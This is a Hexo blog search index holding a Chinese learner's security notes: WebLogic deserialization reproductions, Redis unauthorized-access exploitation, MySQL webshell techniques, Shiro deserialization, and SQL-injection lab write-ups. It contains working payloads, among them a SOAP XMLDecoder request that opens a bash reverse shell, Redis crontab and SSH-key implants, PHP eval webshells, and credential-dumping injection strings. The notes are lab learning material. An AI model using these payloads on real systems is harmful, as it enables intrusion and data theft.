{"meta":{"title":"redfish的学习笔记","subtitle":"redfish的学习笔记","description":"","author":"John Doe","url":"https://REDREDREDFISH.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-12-02T08:13:30.951Z","updated":"2021-12-02T08:13:30.951Z","comments":false,"path":"categories/index.html","permalink":"https://redredredfish.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-12-02T14:03:06.936Z","updated":"2021-12-02T14:03:06.936Z","comments":true,"path":"repository/index.html","permalink":"https://redredredfish.github.io/repository/index.html","excerpt":"","text":"Githubgithub: username: REDREDREDFISH # github username"},{"title":"标签","date":"2021-12-02T09:44:47.223Z","updated":"2021-12-02T08:13:30.956Z","comments":false,"path":"tags/index.html","permalink":"https://redredredfish.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-12-02T15:48:58.244Z","updated":"2021-12-02T08:13:30.952Z","comments":true,"path":"links/index.html","permalink":"https://redredredfish.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"面试-默安","slug":"面试-默安","date":"2021-11-11T14:09:00.000Z","updated":"2021-12-06T14:19:40.902Z","comments":true,"path":"2021/11/11/面试-默安/","link":"","permalink":"https://redredredfish.github.io/2021/11/11/%E9%9D%A2%E8%AF%95-%E9%BB%98%E5%AE%89/","excerpt":"","text":"岗位：安服实习生时间：2021.10.10过程1、自我介绍2、技术web:渗透思路 怎么绕过CDN 怎么找真实ip xss类型和原理 sql盲注用了哪些函数 宽字节注入的原理 怎么修复sql注入 CSRF的原理 文件上传白名单怎么绕 文件上传后端验证怎么绕 =号被禁用怎么替代 mysql写shell的方式 shiro反序列化的原理 印象深刻的渗透经验 内网详细的信息搜集 怎么找域控 怎么判断是域还是工作组还是别的环境 隧道代理 UDF提权 端口复用端口转发 CS免杀 3、项目经历HW干了啥 总结当时有点紧张，web答的不够全面，内网基本不会，回过头来看其实不难，我是个没用的安服(T_T)","categories":[{"name":"面经","slug":"面经","permalink":"https://redredredfish.github.io/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://redredredfish.github.io/tags/%E9%9D%A2%E7%BB%8F/"}],"author":"redfish"},{"title":"weblogic反序列化漏洞的初级理解(二)","slug":"weblogic反序列化漏洞的初级理解-二","date":"2021-07-08T07:18:00.000Z","updated":"2021-12-06T07:19:19.216Z","comments":true,"path":"2021/07/08/weblogic反序列化漏洞的初级理解-二/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/","excerpt":"","text":"前言接着上篇，这次复现经典的weblogic反序列化漏洞—CVE-2018-2628属于利用T3协议配合RMP接口反向发送反序列化数据。同样先利用vulhub快速复现，然后再来看看原理。 漏洞复现CVE-2018-2628 影响范围：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3 docker开启环境 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose up -d 浏览器访问localhost:7001/console，出现weblogic的登录界面，说明环境已经搭好了 (╹ڡ╹ )vulhub yyds!可以看到weblogic的版本是10.3.6.0利用ysoserial启动一个JRMP Server服务监听这里插一句编译ysoserial注意JDK版本不要过高，建议在1.7u21以下，卡了好久┗|｀O′|┛ 开启监听，命令执行这里老办法，尝试新建一个shell文件，比较直观 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 &quot;touch /tmp/shell&quot; 使用vulhub提供的exp脚本，为了方便，保存在ysoserial-0.0.6-SNAPSHOT-all.jar同目录下执行exp 1python CVE-2018-2628exp.py [开启weblogic的IP] [端口] ysoserial-0.0.6-SNAPSHOT-all.jar [开启JRMP Server的IP] [监听端口] JRMPClient exp开始跑，监听成功 exp跑完，进入docker容器查看文件是否创建成功 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose exec weblogic bash 复现完成 漏洞原理看一下官方的漏洞简介 Oracle WebLogic Server是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务器，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。WLS Core是其中的一个核心组件。 Oracle WebLogic Server中的WLS核心组件存在远程代码执行漏洞。攻击者可通过远程发送攻击数据，借助T3协议在WebLogic Server中执行反序列化操作利用该漏洞执行代码。 首先需要搞懂啥是T3协议 T3协议：WebLogic Server 中的 RMI(远程方法调用)通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。JRMP Server服务：java远程消息交换协议 利用nmap快速检测T3协议是否开放 1nmap -sV IP --script=weblogic-t3-info.nse -p 7001 大致流程 结合exp来看主函数很短，接收JRMP参数，执行exploit函数exploit中，看名字t3_handshake和build_t3_request_object应该是建立T3连接，generate_payload应该是序列化数据,send_payload_objdata自然就是发送数据包了发送T3协议头数据包构造序列化数据包并发送 修复建议打补丁对T3协议进行访问控制 参考https://www.cnblogs.com/afanti/p/10256840.htmlhttps://blog.csdn.net/u014715599/article/details/85256193","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"weblogic反序列化漏洞的初级理解(一)","slug":"weblogic反序列化漏洞的初级理解-一","date":"2021-07-08T03:07:00.000Z","updated":"2021-12-06T03:09:51.923Z","comments":true,"path":"2021/07/08/weblogic反序列化漏洞的初级理解-一/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/","excerpt":"","text":"啥是weblogic WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件大概可以理解为tomcat pro max🙃 Weblogic反序列化漏洞的几个利用阶段从利用方式来看,分为三类 1.直接通过T3协议发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)2.利用T3协议配合RMP或ND接口反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用IIOP协议的CVE-2020-25513.通过 javabean XML方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729) 漏洞复现由于漏洞众多，搭建环境比较复杂，还是先利用vulhub中的CVE-2017-10271、CVE-2018-2628、CVE-2018-2894、CVE-2020-14882几个标志性的漏洞环境进行复现。 先从最古老的开始 CVE-2017-10271 影响范围：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0 docker开启环境 1root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d 远古版本，环境好大先忍一下 等待的过程中先理解一下漏洞原理以及vulhub给出的poc 该漏洞主要针对weblogic的WLS-WebServices组件属于上述反序列化漏洞利用的第三类大致的原理通过传输javabean XML方式构造恶意XML数据造成代码执行 结合poc来看 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body /&gt;&lt;/soapenv:Envelope&gt; 大概是向网站的/wls-wsat/CoordinatorPortType路径传入xml数据，这串xml目的是反弹shellOK，环境起好开始复现 访问localhost:7001/wls-wsat/CoordinatorPortType，显示wls-wsat组件的一些配置信息，表示服务已经开启本地监听6666端口 1root@kali:/# nc -l -p 6666 bp抓包重放构造好的数据包，注意字段Content-Type改为text/xml成功反弹shell，服务器执行了我们传入的/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 漏洞原理漏洞利用的过程很简单有两个疑问点 1.wls-wsat组件如何处理xml数据2.造成反序列化漏洞的关键点在哪 尝试传入任意命令在响应中看到了返回的xml数据以及整个处理过程的调用栈可以看到处理过程最后调用了java.beans.XMLDecoder方法，该方法用于将XML数据反序列化为java对象，这里造成了无回显的命令执行 根据vulhub提供的技术文档、参考大佬的分析过程可以得知大致的处理过程 1.根据POC，当我们传入&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;标签包裹的数据时，wls-wsat使用了weblogic自带的webservices处理程序来处理SOAP请求2.该处理程序首先调用weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法获取到我们传入的xml数据为var1，定义var2为处理过的var1数据3.通过var2.get()方法中的WorkAreaConstants.WORK_AREA_HEADER参数获取&lt;work:WorkContext &gt;标签中的内容4.当var3不为空时，执行readHeaderOld(var3); 5.在readHeaderOld中，实例化了WorkContextXmlInputAdapter，此时方法内的var4是java标签里的内容 6.在实例化WorkContextXmlInputAdapter中，直接调用xmlDecoder反序列化传入的xml数据，也就是处理过的var4 从整个过程中可以发现，传入的xml数据从始至终都没有受到任何过滤，wls-wsat的类似剥洋葱的处理方式一层一层揭开最后直接反序列化，这样显然是很不安全滴。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"redis未授权访问","slug":"helloworld","date":"2021-07-07T08:05:00.000Z","updated":"2021-12-06T03:10:31.762Z","comments":true,"path":"2021/07/07/helloworld/","link":"","permalink":"https://redredredfish.github.io/2021/07/07/helloworld/","excerpt":"","text":"redis未授权访问的利用方式漏洞原理： Redis&lt;3.2默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的安全策略，比如添加防火墙黑白名单等等，这样会将Redis服务暴露在公网上。如果在没有设置密码(默认为空)的情况下，会导致任意用户可以未授权访问Redis以及读取Redis的数据。攻击者利用Redis自身的提供的config命令，可以进行写文件操作，还可以将ssh公钥写入目标服务器./root/.ssh下的authotrized_keys 文件中，进而可以利用对应私钥直接使用ssh服务器登录目标服务器。漏洞的产生条件有以下两点: Redis绑定在0.0.0.0:6379,且没有进行添加安全策略，直接暴露在公网 没有设置密码认证或者弱密码，可以免密登录redis服务 漏洞复现：环境： 攻击机kali5.7.0 192.168.237.132 靶机1 Ubuntu16.04 192.168.237.128 靶机2 centOS7 192.168.237.133 redis 2.8.17 靶机1开启redis-server，攻击机./redis-cli -h 尝试连接由于靶机1没有开启安全策略且默认没有设置密码认证造成攻击机可以未授权访问且执行命令获取敏感数据 利用方式一：webshell攻击机进行未授权访问，利用redis的config set命令将webshell写入靶机2网站目录下(*Redis Config Set 命令可以动态地调整 Redis 服务器的配置) 1234config set dir #设置路径config set dbfilename #设置文件名set webshell #写入key值“webshell”对应的值save #将所有key值保存在文件中 在靶机2上查看已经写入了shell.php文件 浏览器访问http://靶机2/shell.php,发现成功写入webshell 同理可写入一句话木马\\n\\n\\n换行避免因&lt;?导致shell无法解析 菜刀成功连接 利用方式二：写入SSH公钥实现SSH登录将攻击机本机的公钥作为value，然后通过修改redis的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在靶机2的/root/.ssh下生一个授权的key，从而通过ssh登录靶机2。 1ssh-keygen -t rsa #生成ssh公钥和私钥,默认密码为空 将生成的公钥保存到ssh.txt 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ssh.txt 将保存的公钥ssh.txt写入靶机2 redis的key值ssh中 1cat /root/.ssh/ssh.txt | redis-cli -h 靶机2 -x set ssh 远程登录靶机2的redis服务，更改redis备份路径为ssh公钥存放目录 1config set dir /root/.ssh 设置上传公钥的备份文件名字为authorized_keys,保存上传攻击机使用ssh免密登录靶机2 成功登录靶机2 利用方式三：crontab定时任务，反弹shell攻击机监听9999端口 1nc -l 端口 远程登录redis，写入定时任务，一分钟后执行bash反弹shell 1234set test &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/攻击机/监听端口 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename testsave 反弹shell成功 利用方式四：执行lua脚本Redis在2.6推出了脚本功能，允许开发者使用lua语言编写脚本传到Redis中执行。暂时还没找到怎么利用lua执行系统命令。 编写lua脚本test.lua输出字符hello,world! 12local a = &quot;hello,world!&quot;return a redis-cli –eval test.lua -h 靶机2","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"Mysql写shell的几种方式","slug":"Mysql写shell的几种方式","date":"2021-07-06T03:04:00.000Z","updated":"2021-12-08T08:19:13.390Z","comments":true,"path":"2021/07/06/Mysql写shell的几种方式/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"Mysql写shell的几种方式当我们拿到数据库权限时，可通过数据库管理工具写入shell到目标服务器上，利用shell控制目标服务器。 复现环境：phpstudy_pro 8.1.0.6mysql 5.7.26 root权限 网站绝对路径为D:\\phpstudy_pro\\WWW 利用方式： 通过outfile写入shell尝试通过outfile写入文件 1报错[Code: 1290, SQL State: HY000]The MySQL server is running with the –secure-file-priv option so it cannot execute this statement 百度之后找到原因：mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，限制无法导入和导出文件 解决办法：在my.ini配置文件[mysqld]下添加secure_file_priv =&quot;&quot;使其默认为空 新建查询select 12&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;;，成功写入shell.php文件 蚁剑连接http://localhost:122/shell.php成功 向表插入shell并查询导出将一句话木马作为数据插入test1表username字段中 1insert into`test1`(`username`) values (&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;); 查询该数据并导出到shell.php 1select username from test1 into outfile &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 蚁剑连接http://localhost:122/shell.php成功 开启全局日志写入shell首先查看全局日志是否开启 1show variables like &#x27;%general%&#x27;; 如图所示general_log=OFF全局日志未开启 1234开启全局日志 set global general_log = on; 将全局日志路径设置为shell文件路径 set global general_log_file = &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 1新建查询select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;; mysql会将执行的语句记录到全局日志，从而将shell写入网站目录 蚁剑连接成功 慢查询日志写入shell由于在mysql&gt;5.6.34中，secure_file_priv会阻拦我们使用outfile写入文件，没有服务器权限无法修改my.ini配置文件，可以利用慢查询日志写入shell，原理和利用全局日志差不多。首先一样查看慢查询日志是否开启 1show variables like &#x27;%slow_query_log%&#x27;; 开启慢查询日志并修改日志文件的绝对路径 使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中 1查询mysql系统时间 show global variables like &#x27;%long_query_time%&#x27;; 向日志中写入shell 1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);设置查询时间为11s 执行成功 蚁剑连接成功 phpMyAdmin文件包含漏洞CVE-2018-19968CVE-2018-12613CVE-2016-5734CVE-2014-8959","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"web漏洞/sql注入/mysql注入/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"}],"author":"redfish"},{"title":"shiro反序列化的初级理解","slug":"shiro反序列化","date":"2021-07-06T02:37:00.000Z","updated":"2021-12-06T03:09:26.034Z","comments":true,"path":"2021/07/06/shiro反序列化/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"shiro反序列化原理rememberMe功能：shiro框架提供了rememberMe功能，这个功能大概是用户登录成功后会生成一个凭证组，shiro将它经过序列化-&gt;AES加密-&gt;Base64加密得到一串数据流传回给cookie，下次登录时，shiro通过Base64解码-&gt;AES解密-&gt;反序列化验证cookie中的rememberMe包含的凭证组是否正确，从而实现“下次登录记住我”的功能。 漏洞原理：造成shiro反序列化漏洞的关键点，一个是Shiro&lt;1.2.4中，AES-CBC加解密时key默认为硬编码，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据；另一个点是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。 漏洞利用： 首先需要获取正确的key值，利用shiro接收错误rememberMe会抛出异常返回Set-Cookie的特性，可以通过爆破，直到响应头中不包含Set-Cookie，说明key成功匹配。 接着需要对恶意数据进行序列化，shiro序列化对象只有继承PrincipalCollection时，类型转换才正常，不然会抛出异常，这里可以借助ysoserial生成序列化数据：利用ysoserial中的JRMP监听模块进行反弹shell，需使用Java Runtime 配合 bash 编码 java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 监听端口CommonsCollections4 ‘bash编码’ 利用ysoserial生成.ser文件 java -jarysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 “命令” &gt; x.ser 然后进行AES加密、Base64加密，伪造cookie，执行命令 如何判断一个网站是否使用了shiro框架在请求包中的cookie字段添加rememberMe=xxx,查看响应头中是否包含rememberMe=deleteMe值例如：","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"墨者-SQL注入漏洞测试(报错盲注) 题解","slug":"墨者-SQL注入漏洞测试-报错盲注-题解","date":"2021-06-21T08:20:00.000Z","updated":"2021-12-08T08:26:44.798Z","comments":true,"path":"2021/06/21/墨者-SQL注入漏洞测试-报错盲注-题解/","link":"","permalink":"https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/","excerpt":"","text":"靶场地址：https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe 依旧是mysql、无防护 ①依旧是公告界面 url:http://219.153.49.228:44679/new_list.php?id=1 1&#39;,1&#39; and &#39;1&#39;=&#39;1&#39; -- q,1&#39; and &#39;1&#39;=&#39;2&#39; -- q判断存在字符型注入 数据库类型为MariaDB ②order by 判断字段数为4，union select无回显 ③尝试报错注入，利用函数updatexml() updatexml参数(目标xml内容,xml文档路径,更新的内容) 当文档路径包含字符~,会判断不合法，输出字符~报错 利用concat函数将子查询语句与字符~拼接 例如：concat(0x7e,(select user())) 会将查询结果拼接~报错输出 所以尝试 id=1&#39; and updatexml(1,concat(0x7e,(select user())),1) -- q判断存在报错注入 ④接下来还是联合注入那一套，替换子查询语句即可 id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),1) -- q 爆出库名information_schema,mysql,perfor 查询perfor库是空的 database()查询出当前数据库为stormgroup，居然不在schema_name里 爆出表名member,notice 表member爆出字段name,password,status ⑤分别查询字段值 id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(字段) from member)),1) -- q name字段：mozhe,mozhe status字段：0,1 查询password字段时，根据另外两个字段可知有两条数据，因为报错长度最多为32位，字符~占了1位，剩下31位不够输出第一个32位的MD5密码，而且第一条数据status字段值为0，大概率用不了。 直接查询第二条数据 id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from member where status=&#39;1&#39;)),1) -- q得到~76e59b744c5db295a5f0b66f2e9a192 依旧少了一位，利用函数substr(字符串，32，1)输出第32位字符 id=11111111&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),32,1) from member where status=1)),1) -- q 得到~e 拼一拼得到76e59b744c5db295a5f0b66f2e9a192e 解密得到945748 mozhe/945748登录得到key","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"}],"author":"redfish"},{"title":"墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解","slug":"墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解","date":"2021-06-20T08:14:00.000Z","updated":"2021-12-08T08:26:34.683Z","comments":true,"path":"2021/06/20/墨者-SQL手工注入漏洞测试（MySQL数据库-字符型）题解/","link":"","permalink":"https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/","excerpt":"","text":"靶场地址：https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe 题解：①启动靶场 url：http://219.153.49.228:43157/ 是一个登录界面，显然需要登录获得key，一开始使用万能密码、抓包都没找到注入点，结果在这个滚动的公告页面 url:http://219.153.49.228:43157/new_list.php?id=tingjigonggao ②进入页面，url中有id=tingjigonggao，显示是get的字符型参数 试一下id=tingjigonggao&#39;，报错 试一下id=tingjigonggao&#39; and &#39;1&#39;=&#39;1&#39; -- q,页面正常 试一下id=tingjigonggao&#39; and &#39;1&#39;=&#39;2&#39; -- q,页面不正常 判断存在字符型注入。 ③判断字段数 id=aaa&#39; order by 5 -- q，报错 id=aaa&#39; order by 4 -- q，没数据，正常 判断字段数为4。 ④判断回显点 id=aaa&#39; union select 1,2,3,4 -- q2,3参数处回显。 ⑤参数替换version()查看版本 id=aaa&#39; union select 1,2,version(),4 -- qMariaDB-10.2.15&gt;mysql5.0,放心用information_schema库。 ⑥查询所有库名 id=aaa&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata -- q获得库名information_schema,mozhe_discuz_stormgroup,mysql,performance_schema,test ⑦查询mozhe_discuz_stormgroup库中的表id=aaa&#39; union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; -- q获得表名notice,stormgroup_member⑧查询stormgroup_member表中字段名id=aaa&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; -- q获得字段名id,name,password,status ⑨查询字段值id=aaa&#39; union select 1,2,group_concat(name,0x7c,password),4 from stormgroup_member -- q获取用户名和MD5加密的passwordmozhe|356f589a7df439f6f744ff19bb8092c0,mozhe|57673e9e6b26829ba7a4b4d43e8ae8a7somd5解密得到两个密码dsan13，891185，后面一个是对的，离谱。。。登录获取key。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"联合注入","slug":"联合注入","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"靶场","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"redfish"},{"title":"sql注入基础-mysql联合注入","slug":"sql注入基础-mysql联合注入","date":"2021-06-20T08:10:00.000Z","updated":"2021-12-08T08